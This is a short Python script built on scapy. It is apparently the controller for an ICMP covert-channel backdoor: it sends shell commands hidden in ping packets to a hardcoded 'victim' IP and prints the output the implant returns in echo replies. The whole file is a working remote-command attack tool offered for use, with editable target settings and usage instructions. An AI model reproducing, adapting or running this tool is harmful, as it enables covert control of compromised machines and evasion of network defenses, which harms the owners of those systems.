#!/usr/bin/python3
from scapy.all import IP, ICMP, Raw, send, sniff
from os import popen
from sys import argv
import threading
from time import sleep

# Modify below vars as needed
VICTIM_IP = "10.42.2.15"
IF_NAME = "enp0s3" # ens160 also common

SRC_IP = popen("ip -4 addr show " + IF_NAME + " | awk '/inet /{print $2}' | cut -d'/' -f1").read().strip()

def send_command(victim_ip, command, force):
    pkt = IP(src=SRC_IP, dst=victim_ip, id=(6751 if not force else 31)) /\
        ICMP(type=8, id=6751, seq=1) /\
        Raw(load=command)
    send(pkt, verbose=False)

keep_sniffing = True
def process_packet(packet):
    global keep_sniffing
    if packet.haslayer(ICMP) and packet[ICMP].type == 0:
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            output = payload.decode('utf-8').strip()
            print(output)
            keep_sniffing = False

def start_sniffing():
    sniff(iface=IF_NAME, filter="icmp", prn=process_packet, store=0)

def main():
    if len(argv) < 2 or argv[1] == "":
        print("Usage: ./script.py <command> [-f]")
        return

    cmd = ' '.join(argv[1:])
    if (force := (argv[1] == "-f")):
        cmd = ' '.join(argv[2:])

    # Start sniffing in a separate thread
    sniffing_thread = threading.Thread(target=start_sniffing, daemon=True)
    sniffing_thread.start()

    # Send the command to the victim IP
    send_command(VICTIM_IP, cmd, force)

    # Wait until sniffing is complete
    while keep_sniffing:
        sleep(0.1)

if __name__ == "__main__":
    main()